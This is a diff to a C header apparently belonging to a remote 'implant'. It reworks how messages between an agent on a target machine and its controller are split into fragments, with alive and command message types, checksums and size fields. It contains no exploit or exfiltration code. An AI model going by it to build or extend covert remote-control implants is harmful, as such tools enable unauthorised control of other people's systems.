@@ -17,40 +17,36 @@
 
 #define RET_ERROR	-1
 #define RET_OK		0
+#define RET_ORDER	1
 
 #define FRAGMENT_SIZE		4096
-#define FIRST_PAYLOAD_SIZE	4084
-#define NEXT_PAYLOAD_SIZE	4088
+#define PAYLOAD_SIZE		4076
+#define INITIAL_SIZE		20
 
-// #define BUFFERSIZE		4096
-// #define FRAGMENTSIZE	BUFFERSIZE + 8
 #define AGENT_TIMEOUT	60
 
 // macro to return size of structure field
 #define member_size(type, member)	(sizeof( ((type *)0)->member))
 
-typedef struct First_Payload{
-	int32_t total_size;
-	union {
-		char actual_payload[FIRST_PAYLOAD_SIZE];
-		uint32_t alive_time;
-	};
-	
-} First_Payload;
 
 typedef struct Fragment{
 	int32_t type;						// type of message (0 for alive, 1 for command)
-	int32_t index;						// index of fragment in complete message
-	union {
-		char next_payload[NEXT_PAYLOAD_SIZE];			// payload
-		First_Payload first_payload;
+	int32_t index;						// index of fragment
+	int32_t total_size;					// size of complete message, will be 0 for alive message
+	int32_t next_size;					// size of next fragment
+	union{
+		uint32_t checksum;				// checksum of complete message, not present in alive messages
+		uint32_t alive_time;			// if this is an alive message, include the epoch time of when agent was started on target
 	};
+	char buffer[PAYLOAD_SIZE];			// contents of message
 } Fragment;
 
-// Make sure that we have the correct payload sizes defined
-// Check FIRST_PAYLOAD_SIZE
-static_assert(FRAGMENT_SIZE == FIRST_PAYLOAD_SIZE + member_size(Fragment, type) + member_size(Fragment, index) + member_size(First_Payload, total_size));
-// Check NEXT_PAYLOAD_SIZE
-static_assert(FRAGMENT_SIZE == NEXT_PAYLOAD_SIZE + member_size(Fragment, type) + member_size(Fragment, index));
+// // Make sure that we have the correct payload sizes defined
+// // Check PAYLOAD_SIZE
+// static_assert(FRAGMENT_SIZE == PAYLOAD_SIZE + member_size(Fragment, type) + member_size(Fragment, index) + member_size(Fragment, total_size) + member_size(Fragment, next_size) + member_size(Fragment, checksum));
+// static_assert(FRAGMENT_SIZE == PAYLOAD_SIZE + member_size(Fragment, type) + member_size(Fragment, index) + member_size(Fragment, total_size) + member_size(Fragment, next_size) + member_size(Fragment, alive_time));
+// // Check INITIAL_SIZE
+// static_assert(INITIAL_SIZE == member_size(Fragment, type) + member_size(Fragment, index) + member_size(Fragment, total_size) + member_size(Fragment, next_size) + member_size(Fragment, checksum));
+// static_assert(INITIAL_SIZE == member_size(Fragment, type) + member_size(Fragment, index) + member_size(Fragment, total_size) + member_size(Fragment, next_size) + member_size(Fragment, alive_time));
 
 #endif /* _IMPLANT_H */
